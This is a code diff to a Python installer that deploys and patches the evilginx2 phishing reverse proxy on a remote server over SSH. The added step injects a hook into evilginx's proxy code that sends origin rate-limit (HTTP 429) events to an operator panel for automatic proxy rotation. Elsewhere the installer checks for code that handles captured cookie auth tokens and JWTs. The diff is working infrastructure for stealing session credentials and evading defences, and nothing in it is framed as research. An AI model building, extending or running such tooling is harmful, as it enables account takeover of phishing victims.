@@ -40,7 +40,7 @@ if getattr(sys, "frozen", False) and hasattr(sys, "_MEIPASS"):
     HERE = sys._MEIPASS
 PAYLOAD = os.path.join(HERE, "payload")
 PANEL_PORT = 8443
-PANEL_BUILD = "3.3.0"  # keep in sync with payload/app.py PANEL_VERSION
+PANEL_BUILD = "3.4.0"  # keep in sync with payload/app.py PANEL_VERSION
 GO_VER = "1.20"
 REMOTE_HOME_DEFAULT = "/root"
 REMOTE_EGX = "/root/evilginx2"
@@ -448,6 +448,27 @@ class Installer:
             last = out
         raise RuntimeError("git clone evilginx2 failed\n" + last[-1500:])
 
+    def patch_evilginx_429(self):
+        """Origin HTTP 429 → panel /api/internal/egx-429 (proxy auto-rotate)."""
+        self.set_pct(63)
+        self.log("[*] Patching evilginx 429 hook (origin → panel)")
+        local = os.path.join(PAYLOAD, "patches", "apply_egx_429_hook.py")
+        if not os.path.isfile(local):
+            raise RuntimeError("missing payload/patches/apply_egx_429_hook.py")
+        txt = open(local, encoding="utf-8", errors="replace").read()
+        for mark in ("egx-429", "StatusCode == 429", "auth_tokens = pl.cookieAuthTokens"):
+            if mark not in txt:
+                raise RuntimeError(f"429 hook script outdated (missing {mark})")
+        remote_py = "/tmp/apply_egx_429_hook.py"
+        self.ssh.put_file(local, remote_py)
+        go_src = f"{REMOTE_EGX}/core/http_proxy.go"
+        code, out = self.ssh.run(f"python3 {remote_py} {go_src}", timeout=30)
+        if code != 0:
+            raise RuntimeError("evilginx 429 hook patch failed\n" + (out or "")[-1500:])
+        if not self.ssh.ok(f"grep -q egx-429 {go_src}"):
+            raise RuntimeError("evilginx 429 hook missing after patch")
+        self.log("[+] 429 hook in http_proxy.go")
+
     def build_evilginx(self):
         self.set_pct(68)
         self.log("[*] Building evilginx (make)")
@@ -491,7 +512,9 @@ class Installer:
                 loc = os.path.join(static_dir, name)
                 if os.path.isfile(loc):
                     mapping.append((loc, f"{REMOTE_PANEL}/static/{name}"))
+        hook_py = os.path.join(PAYLOAD, "patches", "apply_egx_429_hook.py")
         required_marks = {
+            hook_py: ["egx-429", "StatusCode == 429", "auth_tokens = pl.cookieAuthTokens"],
             os.path.join(PAYLOAD, "app.py"): ["def api_sessions_clear", "def api_fs_list", "def api_service_create", "def favicon", "def _cookie_looks_like_jwt", "class ShellManager", "class JournalFollower", "def api_health", "def api_proxy_key", "import proxy_engine"],
             os.path.join(PAYLOAD, "proxy_engine.py"): [
                 "def deploy_async", "class _Sidecar", "def record_auth_429", "def repair_instance",
@@ -513,6 +536,12 @@ class Installer:
             p = os.path.join(PAYLOAD, "static", need)
             if not os.path.isfile(p):
                 raise RuntimeError(f"Missing panel icon in payload: static/{need}")
+        if not os.path.isfile(hook_py):
+            raise RuntimeError("Missing payload/patches/apply_egx_429_hook.py")
+        hook_txt = open(hook_py, encoding="utf-8", errors="replace").read()
+        hook_missing = [m for m in required_marks[hook_py] if m not in hook_txt]
+        if hook_missing:
+            raise RuntimeError(f"Payload outdated (apply_egx_429_hook.py missing: {hook_missing})")
         for loc, rem in mapping:
             if not os.path.isfile(loc):
                 raise RuntimeError(f"Missing payload file: {loc}")
@@ -614,6 +643,7 @@ WantedBy=multi-user.target
         self.install_mysql_connector_system()
         self.fix_dns()
         self.clone_evilginx()
+        self.patch_evilginx_429()
         self.build_evilginx()
         self.deploy_panel()
         self.firewall()
